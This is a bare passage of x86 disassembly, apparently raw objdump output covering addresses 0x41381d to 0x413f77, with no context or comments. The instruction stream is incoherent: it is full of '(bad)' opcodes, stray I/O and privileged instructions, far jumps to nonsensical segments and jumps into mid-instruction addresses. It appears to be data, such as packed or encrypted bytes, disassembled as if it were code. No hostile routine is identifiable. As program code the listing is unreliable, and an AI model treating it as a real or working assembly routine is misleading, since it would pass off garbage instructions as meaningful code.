  41381d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41381f:	and    DWORD PTR [eax-0x6098d6e7],esi
  413825:	int3   
  413826:	jle    0x41387a
  413828:	xchg   edi,edi
  41382a:	inc    ebx
  41382b:	mov    ch,0x23
  41382d:	add    ebp,edx
  41382f:	dec    esp
  413830:	mov    DWORD PTR [ecx+edx*1],eax
  413833:	sub    ecx,edi
  413835:	pop    ebx
  413836:	outs   dx,BYTE PTR ds:[esi]
  413837:	and    BYTE PTR [ebx],dl
  413839:	or     al,0x13
  41383b:	jns    0x41384e
  41383d:	in     eax,0x49
  41383f:	mul    ebp
  413841:	pop    ebx
  413842:	out    dx,al
  413843:	outs   dx,DWORD PTR ds:[esi]
  413844:	xor    esi,esi
  413846:	test   BYTE PTR [ecx-0x6159aecf],ah
  41384c:	push   esp
  41384d:	jnp    0x413896
  41384f:	xlat   BYTE PTR ds:[ebx]
  413850:	retf   
  413851:	shl    BYTE PTR [ebx],0x56
  413854:	out    0xd2,eax
  413856:	jmp    0x41384a
  413858:	jle    0x41387f
  41385a:	push   0x2ffb7b0e
  41385f:	(bad)  
  413860:	and    al,BYTE PTR [ecx-0x59939746]
  413866:	xchg   ebp,eax
  413867:	xchg   edx,eax
  413868:	push   es
  413869:	imul   DWORD PTR [eax+0x2c]
  41386c:	fwait
  41386d:	mov    eax,0x98013b8
  413872:	xlat   BYTE PTR ds:[ebx]
  413873:	mov    DWORD PTR [edx+0x51],ebx
  413876:	fmul   DWORD PTR [esp-0x3a]
  41387a:	pop    es
  41387b:	push   edx
  41387c:	inc    esp
  41387d:	dec    edx
  41387e:	iret   
  41387f:	repnz sahf 
  413881:	retf   
  413882:	out    0xe2,eax
  413884:	fadd   QWORD PTR [ecx+0x6cf03194]
  41388a:	cli    
  41388b:	ret    0xbeca
  41388e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388f:	in     al,dx
  413890:	xchg   ebp,eax
  413891:	in     eax,0x9e
  413893:	retf   
  413894:	retf   
  413895:	adc    eax,0xe1a4adec
  41389a:	js     0x4138dc
  41389c:	das    
  41389d:	mov    edi,0x79323258
  4138a2:	mov    esp,0xb98998fe
  4138a7:	and    eax,0xf4cb5a3a
  4138ac:	mov    DWORD PTR [ecx-0x27c718de],esi
  4138b2:	les    ebx,FWORD PTR [ecx+eiz*4-0x60]
  4138b6:	hlt    
  4138b7:	pop    es
  4138b8:	les    edx,FWORD PTR [ecx+eax*8]
  4138bb:	sbb    dl,BYTE PTR ds:0x294b1739
  4138c1:	mov    edi,0xe82ce319
  4138c6:	xor    eax,0xb234f155
  4138cb:	cld    
  4138cc:	dec    esi
  4138cd:	adc    DWORD PTR [ebp-0x73],ebx
  4138d0:	mov    bl,0x43
  4138d2:	clc    
  4138d3:	jae    0x4138d8
  4138d5:	mov    ah,0xc6
  4138d7:	add    ah,BYTE PTR [ecx+0x2c]
  4138da:	int    0xc9
  4138dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138dd:	and    edx,DWORD PTR [ecx]
  4138df:	cmp    eax,0xbe2da476
  4138e4:	fstp   st(7)
  4138e6:	jp     0x41387f
  4138e8:	cs in  eax,0xac
  4138eb:	lods   al,BYTE PTR ds:[esi]
  4138ec:	addr16 xor al,0xd5
  4138ef:	aas    
  4138f0:	sub    ebp,edi
  4138f2:	pop    edi
  4138f3:	sbb    eax,0xf7c055fa
  4138f8:	sub    bl,BYTE PTR [ebp+edi*4-0x4]
  4138fc:	clc    
  4138fd:	jp     0x4138ce
  4138ff:	or     ch,BYTE PTR [edx]
  413901:	or     ebx,DWORD PTR [edx+0x5f]
  413904:	adc    esi,edi
  413906:	popf   
  413907:	dec    esi
  413908:	adc    bh,BYTE PTR [esi-0x631c27fe]
  41390e:	int3   
  41390f:	jo     0x4138e8
  413911:	jae    0x413928
  413913:	xor    bl,BYTE PTR [esi-0x15]
  413916:	test   BYTE PTR [ecx+0x33],0xfa
  41391a:	mov    ds:0x34d1c0f,al
  41391f:	mov    ebx,0x69739f4e
  413924:	fcom   QWORD PTR [ebp+0x4c]
  413927:	pop    edx
  413928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413929:	not    BYTE PTR [ecx]
  41392b:	stos   BYTE PTR es:[edi],al
  41392c:	sbb    BYTE PTR [ebx],ah
  41392e:	fwait
  41392f:	stos   BYTE PTR es:[edi],al
  413930:	fdivp  st(7),st
  413932:	std    
  413933:	fld    QWORD PTR [esi-0x20]
  413936:	sub    eax,0x4095a65b
  41393b:	sbb    eax,0x2fa5a87b
  413940:	jne    0x41393c
  413942:	mov    edx,0xd57eb9b
  413947:	ret    0xff63
  41394a:	inc    esi
  41394b:	in     eax,0x1c
  41394d:	mov    WORD PTR [ecx],?
  41394f:	xchg   edx,eax
  413950:	mov    edi,0x5a357475
  413955:	xchg   esp,eax
  413956:	jecxz  0x413983
  413958:	xor    edx,DWORD PTR [edx]
  41395a:	jmp    0xb0e2:0xe53a041c
  413961:	retf   
  413962:	(bad)  
  413963:	fs clc 
  413965:	jmp    0x4bc473af
  41396a:	pop    ss
  41396b:	or     eax,edi
  41396d:	xlat   BYTE PTR ds:[ebx]
  41396e:	xor    dh,BYTE PTR [eax-0x3e38a523]
  413974:	ss jecxz 0x4139be
  413977:	sbb    BYTE PTR [ecx],dl
  413979:	je     0x4139b8
  41397b:	test   BYTE PTR [edi+0x20],dl
  41397e:	daa    
  41397f:	(bad)  
  413980:	adc    eax,0xf680a8d9
  413985:	lods   eax,DWORD PTR ds:[esi]
  413986:	cmp    DWORD PTR [edi],0x11
  413989:	nop
  41398a:	push   edi
  41398b:	repz imul ebx,DWORD PTR [ecx-0x6adc68c4],0x4b
  413993:	ja     0x4139ba
  413995:	mov    edi,0xf0417076
  41399a:	cli    
  41399b:	cmp    ebp,DWORD PTR [ecx+0x6b]
  41399e:	or     edi,eax
  4139a0:	cmc    
  4139a1:	aad    0xa0
  4139a3:	xchg   ebp,eax
  4139a4:	fnstenv [esi+0x1d]
  4139a7:	mov    esp,0xd94bb16a
  4139ac:	sub    cx,WORD PTR [edx+0x30]
  4139b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b1:	mov    al,0xb9
  4139b3:	mov    edi,0x7e3e1e2f
  4139b8:	pop    ebp
  4139b9:	aas    
  4139ba:	xor    eax,0x18902b58
  4139bf:	fcomip st,st(2)
  4139c1:	or     BYTE PTR [edi-0x3d0dddc6],al
  4139c7:	mov    edi,0x5d39e635
  4139cc:	cli    
  4139cd:	test   DWORD PTR [eax+0x68],0xc36a7618
  4139d4:	mov    esi,DWORD PTR [eax+0x76]
  4139d7:	in     al,dx
  4139d8:	ds retf 0x6090
  4139dc:	xchg   edx,eax
  4139dd:	test   al,dl
  4139df:	scas   al,BYTE PTR es:[edi]
  4139e0:	imul   ebx,DWORD PTR [edi],0x51
  4139e3:	sti    
  4139e4:	loope  0x413967
  4139e6:	lods   al,BYTE PTR ds:[esi]
  4139e7:	lock jmp 0xa9ea7346
  4139ed:	xchg   edi,eax
  4139ee:	xor    DWORD PTR [eax],0x4564fb7c
  4139f4:	sub    al,0x2a
  4139f7:	lds    edi,FWORD PTR ss:[edx+0x68]
  4139fb:	loope  0x413989
  4139fd:	pop    es
  4139fe:	mov    eax,0xeee9e045
  413a03:	mov    edi,cs
  413a05:	les    esp,FWORD PTR [edi-0x67d79d01]
  413a0b:	xchg   ebx,eax
  413a0c:	jle    0x413a53
  413a0e:	and    ebx,ebx
  413a10:	out    0x3f,al
  413a12:	mov    esp,0x79fa3a7e
  413a17:	aam    0xe0
  413a19:	cmp    al,0xcc
  413a1b:	stc    
  413a1c:	lods   al,BYTE PTR ds:[esi]
  413a1d:	leave  
  413a1e:	xor    edi,edi
  413a20:	outs   dx,DWORD PTR ds:[esi]
  413a21:	ja     0x413a0c
  413a23:	push   esp
  413a24:	push   esp
  413a25:	lahf   
  413a26:	sbb    al,0x7e
  413a28:	xchg   ebp,eax
  413a29:	addr16 mov ds:0x73fa,al
  413a2d:	add    BYTE PTR [edx+edi*8+0xe6b9c42],0xe8
  413a35:	fld    TBYTE PTR [ebx-0x6724fcdf]
  413a3b:	mov    bh,0xab
  413a3d:	lock cmp al,0x6b
  413a40:	ror    DWORD PTR [ecx],cl
  413a42:	inc    BYTE PTR [esi+0x4f49beb5]
  413a48:	and    DWORD PTR [edx],edx
  413a4a:	adc    al,0xc2
  413a4c:	cmp    ch,bh
  413a4e:	sub    esp,DWORD PTR [ebx+ebp*1-0x41]
  413a52:	dec    ebx
  413a53:	aad    0xba
  413a55:	test   al,0x8a
  413a57:	push   ebp
  413a58:	popf   
  413a59:	cmp    BYTE PTR [eax],al
  413a5b:	xchg   esi,eax
  413a5c:	mov    al,ds:0x211f42b3
  413a61:	lds    esi,FWORD PTR [ebx]
  413a63:	xor    ebx,DWORD PTR [esi-0x2d]
  413a66:	sub    eax,0x941a747b
  413a6b:	stc    
  413a6c:	lods   eax,DWORD PTR ds:[esi]
  413a6d:	icebp  
  413a6e:	sub    DWORD PTR [edx+0x13],ebp
  413a71:	xor    DWORD PTR [esi+eax*2-0x7c],edx
  413a75:	sbb    ebp,DWORD PTR [ebx]
  413a77:	lods   eax,DWORD PTR ds:[esi]
  413a78:	ror    DWORD PTR [ebx],0x21
  413a7b:	push   ebp
  413a7c:	idiv   DWORD PTR [edx]
  413a7e:	sbb    ebp,DWORD PTR [ecx+0x3fbdc97f]
  413a84:	ins    DWORD PTR es:[edi],dx
  413a85:	sub    ebp,ebp
  413a87:	jnp    0x413a34
  413a89:	xchg   ebx,eax
  413a8a:	pop    esp
  413a8b:	push   eax
  413a8c:	outs   dx,BYTE PTR ds:[esi]
  413a8d:	add    ecx,ecx
  413a8f:	jb     0x413a23
  413a91:	hlt    
  413a92:	inc    esi
  413a93:	dec    edx
  413a94:	dec    edx
  413a95:	shl    dh,1
  413a97:	jb     0x413ac1
  413a99:	(bad)  
  413a9a:	mov    edi,0xa6cbc1f6
  413a9f:	scas   eax,DWORD PTR es:[edi]
  413aa0:	mov    ah,0x65
  413aa2:	je     0x413a44
  413aa4:	sub    dh,BYTE PTR [eax-0x777c97fe]
  413aaa:	jbe    0x413add
  413aac:	fnsave [edx-0x780b2197]
  413ab2:	shl    edx,0x14
  413ab5:	lods   al,BYTE PTR ds:[esi]
  413ab6:	es jecxz 0x413b0d
  413ab9:	sub    bl,BYTE PTR [ecx+0x4f]
  413abc:	inc    ebx
  413abd:	ins    DWORD PTR es:[edi],dx
  413abe:	mov    dl,0x4c
  413ac0:	push   esi
  413ac1:	icebp  
  413ac2:	add    al,0x4
  413ac4:	mov    al,0x71
  413ac6:	xor    ah,BYTE PTR [eax]
  413ac8:	cmp    al,0x8e
  413aca:	scas   al,BYTE PTR es:[edi]
  413acb:	in     ax,dx
  413acd:	xchg   bx,ax
  413acf:	cdq    
  413ad0:	adc    eax,0x68225a23
  413ad5:	add    DWORD PTR [eax+ebx*1],0x28
  413ad9:	stc    
  413ada:	sahf   
  413adb:	dec    edx
  413adc:	aam    0x90
  413ade:	aad    0xba
  413ae0:	xchg   esi,eax
  413ae1:	mov    edi,DWORD PTR [edx+eiz*2+0x3c]
  413ae5:	shl    ebx,1
  413ae7:	jb     0x413b2d
  413ae9:	jns    0x413b39
  413aeb:	call   DWORD PTR [ebx-0x175d100d]
  413af1:	add    BYTE PTR [esi],bl
  413af3:	imul   ebx,DWORD PTR [edx-0x4f],0x20
  413af7:	rcl    DWORD PTR [esi-0x1b],1
  413afa:	mov    al,ds:0xc4b2aed0
  413aff:	inc    eax
  413b00:	xchg   esi,eax
  413b02:	mov    ds:0x181272b8,eax
  413b07:	int    0xeb
  413b09:	cmp    al,0x93
  413b0b:	cmp    bh,dl
  413b0d:	scas   al,BYTE PTR es:[edi]
  413b0e:	clc    
  413b0f:	jecxz  0x413b49
  413b11:	(bad)  
  413b13:	push   eax
  413b14:	dec    eax
  413b15:	and    eax,0xae9198db
  413b1a:	lods   al,BYTE PTR ds:[esi]
  413b1b:	(bad)  
  413b1c:	shl    edi,cl
  413b1e:	sbb    DWORD PTR ds:0xa3c45984,ecx
  413b24:	aad    0x61
  413b26:	lea    ecx,[ecx+0x1358966a]
  413b2c:	mov    edi,0x18cd5cfa
  413b31:	dec    edx
  413b32:	jmp    0x413b00
  413b34:	xor    DWORD PTR [edi+eiz*2+0x3a],edx
  413b38:	(bad)  
  413b39:	push   eax
  413b3a:	sub    al,BYTE PTR [edi+ebx*1+0x66ad5a2a]
  413b41:	es int3 
  413b43:	mov    al,0xc8
  413b45:	in     al,dx
  413b46:	push   edi
  413b47:	ds xchg ebx,eax
  413b49:	cmp    al,BYTE PTR [esi]
  413b4b:	mov    edx,0xdb7ddba
  413b50:	xchg   edx,eax
  413b51:	je     0x413ba8
  413b53:	out    0x17,eax
  413b55:	sub    BYTE PTR [ebp-0x29],0x57
  413b59:	pushf  
  413b5a:	cmc    
  413b5b:	xor    eax,0x94f6cc66
  413b60:	mov    dh,0xfa
  413b62:	std    
  413b63:	fld    DWORD PTR ss:[ecx*1-0x538f0ff5]
  413b6b:	call   0x275724c0
  413b70:	mov    eax,0x5ba67fd4
  413b75:	sub    BYTE PTR [ebx-0x35],0x74
  413b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b7a:	jecxz  0x413b5f
  413b7c:	fld    TBYTE PTR [eax+0x37ff3083]
  413b82:	push   0x5c
  413b84:	sub    DWORD PTR [esi],0xffffffdb
  413b87:	sbb    DWORD PTR [ebx+0x77a06e6e],0xedef65f3
  413b91:	inc    eax
  413b92:	lods   eax,DWORD PTR ds:[esi]
  413b93:	inc    ecx
  413b94:	xchg   edi,eax
  413b95:	cmp    eax,0xdfd6eb5e
  413b9a:	inc    edx
  413b9b:	sbb    eax,0xc1934bdb
  413ba0:	dec    eax
  413ba1:	je     0x413b66
  413ba3:	mov    DWORD PTR [ebp+0x4e],ecx
  413ba6:	mov    DWORD PTR [eax-0x7c],eax
  413ba9:	outs   dx,BYTE PTR ds:[esi]
  413baa:	push   ebp
  413bab:	lds    edx,FWORD PTR ds:0x34272a88
  413bb1:	stc    
  413bb2:	push   esi
  413bb3:	push   ds
  413bb4:	xchg   ebp,eax
  413bb5:	jle    0x413bae
  413bb7:	test   al,0x56
  413bb9:	cmp    eax,0x6b40d7fc
  413bbe:	aad    0xe
  413bc0:	add    eax,0x96981081
  413bc5:	pop    ebp
  413bc6:	adc    DWORD PTR [ebx+eax*1],0xffffffba
  413bca:	xor    al,0x8a
  413bcc:	sub    edx,DWORD PTR [ebx]
  413bce:	push   ss
  413bcf:	data16 jecxz 0x413c1b
  413bd2:	ins    DWORD PTR es:[edi],dx
  413bd3:	sub    BYTE PTR [ecx],ch
  413bd5:	mov    dl,0xfa
  413bd7:	enterw 0x5cf8,0x6c
  413bdc:	(bad)  
  413bdd:	xchg   ebp,eax
  413bde:	inc    edx
  413bdf:	dec    esi
  413be0:	sbb    eax,0xc952bfef
  413be5:	push   ebx
  413be6:	lods   eax,DWORD PTR ds:[esi]
  413be7:	scas   eax,DWORD PTR es:[edi]
  413be8:	sub    BYTE PTR [esi-0x15],dh
  413beb:	inc    edx
  413bec:	xchg   ecx,eax
  413bed:	out    0x1c,eax
  413bef:	retf   0x8c24
  413bf2:	pushf  
  413bf3:	je     0x413c3c
  413bf5:	jecxz  0x413c2c
  413bf7:	jne    0x413b98
  413bf9:	retf   
  413bfa:	lock test DWORD PTR [ebp+0x53],ebp
  413bfe:	sbb    BYTE PTR [edx+0x51],0x5c
  413c02:	lods   al,BYTE PTR ds:[esi]
  413c03:	cwde   
  413c04:	clc    
  413c05:	jge    0x413c31
  413c07:	push   ds
  413c08:	and    dl,BYTE PTR [ebp+0x54e4f601]
  413c0e:	in     al,dx
  413c0f:	cmp    ecx,eax
  413c11:	push   ebx
  413c12:	pop    ebp
  413c13:	inc    dl
  413c15:	cmp    bl,BYTE PTR [edi+0x72]
  413c18:	pop    ecx
  413c19:	inc    edx
  413c1a:	setge  BYTE PTR [bx+di]
  413c1e:	sub    al,0xc6
  413c20:	and    ebp,DWORD PTR [eax-0x3f]
  413c23:	push   0xffffff99
  413c25:	dec    ecx
  413c26:	adc    esp,DWORD PTR [ecx+0x5c]
  413c29:	inc    esi
  413c2a:	push   ebx
  413c2b:	and    edi,DWORD PTR [eax+0x2c]
  413c2e:	pop    esi
  413c2f:	int    0x6a
  413c31:	outs   dx,BYTE PTR ds:[esi]
  413c32:	or     ebx,esi
  413c34:	dec    ecx
  413c35:	xchg   esi,eax
  413c36:	outs   dx,BYTE PTR ds:[esi]
  413c38:	pop    es
  413c39:	test   al,0x45
  413c3b:	sahf   
  413c3c:	pop    edx
  413c3d:	hlt    
  413c3e:	arpl   cx,cx
  413c40:	pop    edi
  413c41:	pop    edx
  413c42:	dec    esp
  413c43:	inc    edi
  413c44:	adc    DWORD PTR [edx+0x12],ecx
  413c47:	push   edi
  413c48:	jp     0x413c9f
  413c4a:	mov    edi,0x35cbaea7
  413c4f:	rcr    BYTE PTR [eax],0x8f
  413c52:	loopne 0x413c46
  413c54:	sub    eax,0x7cba06f
  413c59:	loope  0x413ccb
  413c5b:	pop    ebx
  413c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c5d:	cmp    ecx,DWORD PTR [ebp-0x6bc8e0b6]
  413c63:	adc    ch,BYTE PTR [eax]
  413c65:	sbb    esi,DWORD PTR [ebp+ecx*1-0x7c3e7b58]
  413c6c:	scas   eax,DWORD PTR es:[edi]
  413c6d:	int3   
  413c6e:	cwde   
  413c6f:	gs inc ebp
  413c71:	mov    esp,0x367de8c4
  413c76:	inc    ecx
  413c77:	add    DWORD PTR [ebp+0xe],edi
  413c7a:	repnz iret 
  413c7c:	xchg   edx,eax
  413c7d:	cli    
  413c7e:	out    0x19,eax
  413c80:	pop    esp
  413c81:	xor    dh,BYTE PTR ds:0x1e3759ae
  413c87:	mov    ebx,0xc38299fd
  413c8c:	jmp    0x413cb9
  413c8e:	add    al,0xa1
  413c90:	lsl    ebx,WORD PTR [ecx]
  413c93:	mov    ebp,0x25033f64
  413c98:	enter  0x5bfe,0xa4
  413c9c:	aad    0xab
  413c9e:	sbb    BYTE PTR [esi],al
  413ca0:	xor    BYTE PTR [edi+0x7a],ch
  413ca3:	fmulp  st(2),st
  413ca5:	cmc    
  413ca6:	push   ebx
  413ca7:	sub    eax,0xd31389cd
  413cac:	xor    ecx,esi
  413cae:	daa    
  413caf:	jo     0x413cc7
  413cb1:	outs   dx,DWORD PTR ds:[esi]
  413cb2:	xchg   BYTE PTR [bp+si+0x72],bh
  413cb6:	push   DWORD PTR [edi+0x5f48798a]
  413cbc:	sub    DWORD PTR [ebx+0x2e82d12c],ebp
  413cc2:	popf   
  413cc3:	and    bl,al
  413cc5:	addr16 push edx
  413cc7:	jnp    0x413d29
  413cc9:	les    ebx,FWORD PTR [ebx+eiz*8+0x34]
  413ccd:	or     BYTE PTR [esi],al
  413ccf:	jl     0x413cb2
  413cd1:	iret   
  413cd2:	jbe    0x413ce6
  413cd4:	jae    0x413d0a
  413cd6:	dec    eax
  413cd7:	ror    DWORD PTR [eax+0x228fd382],cl
  413cdd:	xchg   BYTE PTR [eax],dh
  413cdf:	jns    0x413cd1
  413ce1:	dec    ebp
  413ce2:	dec    esp
  413ce3:	sahf   
  413ce4:	stc    
  413ce5:	test   DWORD PTR ds:0x22516411,edi
  413ceb:	sbb    ch,BYTE PTR [esi+0x1f9c0ce1]
  413cf1:	out    0xc,eax
  413cf3:	icebp  
  413cf4:	mov    dl,0x76
  413cf6:	dec    ecx
  413cf7:	inc    ebx
  413cf8:	les    edx,FWORD PTR [edi+eiz*8-0x51b024a2]
  413cff:	xchg   ecx,eax
  413d00:	lods   al,BYTE PTR ds:[esi]
  413d01:	pop    edx
  413d02:	xchg   ecx,eax
  413d03:	stos   DWORD PTR es:[edi],eax
  413d04:	cwde   
  413d05:	mov    eax,ds:0x3dec96f8
  413d0a:	in     eax,0xe4
  413d0c:	scas   eax,DWORD PTR es:[edi]
  413d0d:	jl     0x413cf2
  413d0f:	xor    dl,BYTE PTR [edx-0x698e7b91]
  413d15:	mov    dl,0xe0
  413d17:	icebp  
  413d18:	push   0xa7085684
  413d1d:	push   ebx
  413d1e:	js     0x413d5f
  413d20:	in     eax,0x1b
  413d22:	or     ecx,DWORD PTR [eax-0x6]
  413d25:	outs   dx,DWORD PTR ds:[esi]
  413d26:	mov    edi,0x1e75d36b
  413d2b:	out    dx,eax
  413d2c:	imul   DWORD PTR ds:0xd73b96d1
  413d32:	or     BYTE PTR [edi-0x1c11bdef],al
  413d38:	std    
  413d39:	fldenv [ecx-0x29e2defd]
  413d3f:	sub    eax,0x48569a2d
  413d44:	test   eax,0xc75aeb49
  413d49:	int    0xdf
  413d4b:	and    eax,0x2f6604e
  413d50:	fdivrp st(0),st
  413d52:	mov    bl,0x87
  413d54:	push   0x9c7da63a
  413d59:	test   eax,0x3ba79201
  413d5e:	or     dh,BYTE PTR [edi]
  413d60:	jmp    0x697d:0x9cfd0bbe
  413d67:	jg     0x413d30
  413d69:	stos   BYTE PTR es:[edi],al
  413d6a:	mov    WORD PTR [esp+eiz*8+0x6d],es
  413d6e:	mov    ah,0xb
  413d70:	outs   dx,DWORD PTR ds:[esi]
  413d71:	fucom  st(4)
  413d73:	mov    ah,0x76
  413d75:	mov    ds:0x555ffe06,eax
  413d7a:	sub    edi,DWORD PTR [ecx+0x4]
  413d7d:	in     al,dx
  413d7e:	and    al,0x1d
  413d80:	shr    al,0xcc
  413d83:	lods   al,BYTE PTR ds:[esi]
  413d84:	fwait
  413d85:	dec    esp
  413d86:	inc    edx
  413d87:	and    eax,0xfc440a95
  413d8c:	into   
  413d8d:	jo     0x413d20
  413d8f:	push   edi
  413d90:	fisubr DWORD PTR [edi-0x8a1cf31]
  413d96:	das    
  413d97:	mov    bl,0xe7
  413d99:	(bad)  
  413d9a:	(bad)  
  413d9b:	xor    ecx,DWORD PTR ds:0xf98dcf60
  413da1:	arpl   ax,ax
  413da3:	dec    edi
  413da4:	add    ah,ch
  413da6:	pop    ecx
  413da7:	sbb    eax,0x934de65b
  413dac:	lea    edx,[edx]
  413dae:	sbb    cl,ch
  413db0:	push   DWORD PTR [ecx-0x6548689a]
  413db6:	adc    BYTE PTR [edi-0x64],ah
  413db9:	test   al,0x48
  413dbb:	ficom  DWORD PTR [ebx+0x4ff6dbf0]
  413dc1:	sbb    al,0xb3
  413dc3:	inc    ebp
  413dc4:	push   ebx
  413dc5:	dec    ecx
  413dc6:	push   ebx
  413dc7:	ins    BYTE PTR es:[edi],dx
  413dc8:	xor    BYTE PTR [ebp+0x1d],cl
  413dcb:	xchg   DWORD PTR [eax+0x6e1f6065],esp
  413dd1:	sbb    DWORD PTR [eax-0x7a4bd617],ebp
  413dd7:	adc    al,0x61
  413dd9:	shl    DWORD PTR [ebx+0x63ed5cdc],1
  413ddf:	mov    al,BYTE PTR [edx+0x1d]
  413de2:	sbb    dh,BYTE PTR [edx]
  413de4:	popf   
  413de5:	xor    DWORD PTR [ebx-0x67],ebx
  413de8:	das    
  413de9:	in     al,dx
  413dea:	xchg   edi,eax
  413deb:	fwait
  413dec:	lods   eax,DWORD PTR ds:[esi]
  413ded:	cwde   
  413dee:	ds pop ss
  413df0:	icebp  
  413df1:	bnd js 0x413e04
  413df4:	sbb    dh,0x5c
  413df7:	xchg   edx,eax
  413df8:	sbb    dh,BYTE PTR [ecx-0x5d]
  413dfb:	outs   dx,DWORD PTR ds:[esi]
  413dfc:	stos   DWORD PTR es:[edi],eax
  413dfd:	enter  0xcf19,0xe6
  413e01:	or     eax,0x9943126e
  413e06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e07:	ins    DWORD PTR es:[edi],dx
  413e08:	inc    ebp
  413e09:	in     al,0x4c
  413e0b:	add    ecx,DWORD PTR [eax]
  413e0d:	jno    0x413da1
  413e0f:	leave  
  413e10:	jmp    0x68523d89
  413e15:	or     BYTE PTR [ebp-0x4bc7ea62],0xc6
  413e1c:	jb     0x413e64
  413e1e:	aam    0xee
  413e20:	dec    ebx
  413e21:	xchg   DWORD PTR [ebx],esi
  413e23:	lods   al,BYTE PTR ds:[esi]
  413e24:	push   es
  413e25:	shl    DWORD PTR gs:[edx+0x7e],1
  413e29:	loop   0x413e4f
  413e2b:	jo     0x413e0c
  413e2d:	sahf   
  413e2e:	mov    al,0x69
  413e30:	in     eax,dx
  413e31:	sahf   
  413e32:	(bad)  
  413e33:	mov    esi,0x2bb2c859
  413e38:	xor    DWORD PTR [edx-0x6a],esi
  413e3b:	and    dh,0xf9
  413e3e:	aas    
  413e3f:	dec    edx
  413e40:	mov    ebx,0xe73c2b5a
  413e45:	sar    DWORD PTR [edi],cl
  413e47:	outs   dx,DWORD PTR ds:[esi]
  413e48:	push   ds
  413e49:	jbe    0x413ead
  413e4b:	or     DWORD PTR [edi-0x14],esp
  413e4e:	lds    ebp,FWORD PTR [esi-0x58]
  413e51:	bound  eax,QWORD PTR [edi]
  413e53:	mov    ds:0x55436d32,al
  413e58:	dec    esp
  413e59:	pop    esi
  413e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e5b:	ins    DWORD PTR es:[edi],dx
  413e5c:	mov    al,ds:0xe2a76d1b
  413e61:	sbb    BYTE PTR [esi],cl
  413e63:	punpcklwd mm1,DWORD PTR [ebx+0x4c1acf5e]
  413e6a:	inc    edx
  413e6b:	retf   
  413e6c:	call   0x1bd09ce6
  413e71:	js     0x413e57
  413e73:	test   BYTE PTR [edx-0x1c],ch
  413e76:	into   
  413e77:	xchg   ebx,eax
  413e78:	cmp    BYTE PTR [esi-0x3c],cl
  413e7b:	int3   
  413e7c:	add    al,0xba
  413e7e:	xchg   ebp,eax
  413e7f:	sub    al,0x78
  413e81:	xor    al,0x9f
  413e83:	aaa    
  413e84:	cdq    
  413e85:	adc    BYTE PTR [eax],0xb9
  413e88:	xor    bh,0xf4
  413e8b:	rcr    BYTE PTR [esi],0x9b
  413e8e:	test   BYTE PTR [ebp-0x3c],al
  413e91:	adc    al,BYTE PTR [ebp-0x4fbff43b]
  413e97:	mov    al,ds:0xc1beccc1
  413e9c:	out    dx,al
  413e9d:	fbld   TBYTE PTR [edi+0x74]
  413ea0:	jne    0x413eea
  413ea2:	push   cs
  413ea3:	xchg   esp,eax
  413ea4:	stos   BYTE PTR es:[edi],al
  413ea5:	into   
  413ea6:	and    ah,dl
  413ea8:	push   ecx
  413ea9:	sbb    ebx,DWORD PTR [eax-0x196a345c]
  413eaf:	repz sub edx,DWORD PTR [ebp-0x45]
  413eb3:	mov    edi,0xee72edc1
  413eb8:	jp     0x413eb5
  413eba:	inc    eax
  413ebb:	push   es
  413ebc:	ss jne 0x413ec1
  413ebf:	mov    al,0x86
  413ec1:	enter  0x85e3,0x7c
  413ec5:	stos   DWORD PTR es:[edi],eax
  413ec6:	push   ebx
  413ec7:	inc    ebx
  413ec8:	cld    
  413ec9:	jge    0x413ee0
  413ecb:	fwait
  413ecc:	outs   dx,BYTE PTR ds:[esi]
  413ecd:	sub    BYTE PTR [ecx],bh
  413ecf:	cmp    eax,0xc58b91b8
  413ed4:	lods   eax,DWORD PTR ds:[esi]
  413ed5:	mov    ds:0xf40d1b03,eax
  413eda:	dec    ebx
  413edb:	jg     0x413eaf
  413edd:	lock mov eax,ds:0xd2575b87
  413ee3:	mov    bh,BYTE PTR [ebx+0x20]
  413ee6:	mov    eax,0x68033090
  413eeb:	stos   BYTE PTR es:[edi],al
  413eec:	push   edi
  413eed:	or     DWORD PTR [esi+ebx*4-0x7f],edx
  413ef1:	inc    esi
  413ef2:	aam    0xd
  413ef4:	push   ss
  413ef5:	sub    ecx,0x353f2402
  413efb:	xchg   ebx,eax
  413efc:	dec    ebp
  413efd:	jmp    0x413eb2
  413eff:	dec    ebp
  413f00:	push   ecx
  413f01:	mov    esp,DWORD PTR [ecx+0x386fd4d6]
  413f07:	sub    dh,cl
  413f09:	ins    BYTE PTR es:[edi],dx
  413f0a:	outs   dx,BYTE PTR ds:[esi]
  413f0b:	enter  0x2e23,0x89
  413f0f:	imul   esi
  413f11:	dec    edx
  413f12:	or     bl,BYTE PTR [esi+0x69]
  413f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f16:	mov    ecx,0xb06e7c10
  413f1b:	pcmpeqd mm2,QWORD PTR [ecx+ecx*2+0x33]
  413f20:	test   BYTE PTR [ebp-0x24b8c01f],ch
  413f26:	inc    esi
  413f27:	lds    ebp,FWORD PTR [ebp-0xb6af97e]
  413f2d:	dec    ebx
  413f2e:	add    al,BYTE PTR [ebx]
  413f30:	pop    fs
  413f32:	jns    0x413f50
  413f34:	mov    dh,0xd0
  413f36:	jb     0x413f3e
  413f38:	dec    esi
  413f39:	test   DWORD PTR [edi],0x149e4b54
  413f3f:	mov    esp,0x8aaea4e4
  413f44:	jl     0x413fad
  413f46:	repz mov ebp,0xcaa9018b
  413f4c:	rol    BYTE PTR [bp+di],1
  413f4f:	js     0x413f42
  413f51:	adc    al,0x9d
  413f53:	jae    0x413f9c
  413f55:	mov    ebx,0xbb252f47
  413f5a:	adc    DWORD PTR [esi+0x68],ebp
  413f5d:	mov    BYTE PTR [ebx-0x30d4efe5],dl
  413f63:	sub    bl,cl
  413f65:	cld    
  413f66:	jmp    0x413f49
  413f68:	ss mov cs,ecx
  413f6b:	ja     0x413f5c
  413f6d:	push   ebx
  413f6e:	lods   al,BYTE PTR ds:[esi]
  413f6f:	inc    ebp
  413f70:	add    eax,ebx
  413f72:	mov    ecx,0x72a1b320
  413f77:	nop
